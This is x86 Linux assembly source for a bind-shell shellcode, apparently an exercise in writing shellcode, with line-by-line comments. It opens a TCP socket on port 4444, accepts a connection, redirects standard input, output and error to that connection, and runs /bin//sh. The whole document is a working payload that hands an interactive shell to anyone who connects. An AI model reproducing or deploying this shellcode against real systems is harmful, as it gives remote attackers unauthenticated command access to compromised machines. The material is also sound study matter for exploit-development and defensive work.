global _start

section .text
_start:

        xor eax,eax             ; we don't know what's in EAX
        xor ebx,ebx                     ; or ebx...
        ; socket(AF_INET, SOCK_STREAM, 0)
        push eax                        ; last arg first, push 0 onto the stack
        mov al,0x66             ; value for socketcall (102)
        mov bl,0x1                      ; value for socket() syscall
        push ebx                        ; second argument to call SOCK_STREAM
        push 0x2                        ; third argument to call AF_INET
        mov ecx,esp             ; the stack pointer is currently pointing to our argument list
        int 0x80                        ; punch it
        mov edx, eax            ; EDX is going to store our socket file descriptor

        ; bind(sockfd, (struct sockaddr *)&serverSA, sizeof(serverSA));
        inc bl                          ; increment bl to 2 to use in our structure
        xor eax,eax                     ; clear eax
        push eax                        ;
        push eax                        ; These 16 bytes of zeroes corresponds with sin_zero in sockaddr_in
        push eax                        ; This is is the sin_addr location of sockaddr_in, all zeroes is INADDR_ANY
        push word 0x5c11        ; This corresponds to sin_port, it has to be in big endian. port = 4444
        push word bx            ; This corresponds with sin_family, 0x2 is AF_INET
        mov esi,esp                     ; keep track of our sockaddr_in structure on the stack with esi
        mov al,0x66                     ; setup the socketcall syscall, ebx is set to 0x2 from earlier which matches bind
        push 0x10                       ; size of sockaddr_in (16)
        push esi                        ; address of our sockaddr_in structure
        push edx                        ; push our socket file descriptor
        mov ecx,esp                     ; stack pointer pointing to our arg list
        int 0x80                        ; make the call

        ;  listen(sockfd, 2);
        xor eax,eax             ; clear eax
        mov al,0x66                     ; setup socketcall
        mov bl,0x4                      ; 0x4 = listen
        push 0x2                        ; our queue is 2 long
        push edx                        ; our file descriptor
        mov ecx,esp                     ; argument list
        int 0x80                        ; make the call

        ;newsockfd = accept(sockfd, (struct sockaddr *)&clientSA, &clientSaSize);
        xor eax,eax                     ; clear eax
        mov al,0x66                     ; setup socketcall
        mov bl,0x5                      ; 0x5 = accept
        push 0x10                       ; size of sockaddr is 16 bytes
        push esp                        ; accept requires the address of the sizeof sockaddr, which ESP is currently pointing to
        push esi                        ; push our old sockaddr_in location to be overwritten, the stack is a mess anyway.
        push edx                        ; our file descriptor
        mov ecx,esp                     ; our argument list
        int 0x80                        ; make the call
        mov edx,eax                     ; copy our new client socket to edx

        ;dup2(newsockfd, 0);
        xor eax,eax                     ; clear eax
        mov al,0x3f                     ; dup2 syscall = 63
        mov ebx,edx                     ; redirect to our client socket
        xor ecx,ecx                     ; clear ecx, 0 is STDIN
        int 0x80                        ; call it

        ;dup2(newsockfd, 1);
        xor eax,eax                     ; clear eax
        mov al,0x3f                     ; dup2 syscall = 63
        mov ebx,edx                     ; redirect to our client socket
        inc cl                          ; ecx = 1, which is STDOUT
        int 0x80                        ; call it

        ;dup2(newsockfd, 2);
        xor eax,eax                     ; clear eax
        mov al,0x3f                     ; dup2 syscall = 63
        mov ebx,edx                     ; redirect to our client socket
        inc cl                          ; ecx = 2, which is STDERR
        int 0x80                        ; call it

        ;execve(arg_list[0], arg_list, arg_list[1]);
        xor eax,eax
        push eax
        push 0x68732f2f
        push 0x6e69622f
        mov ebx, esp
        push eax
        mov edx, [esp]
        push esp
        lea ecx, [esp + 4]
        mov al,0xb
        int 0x80
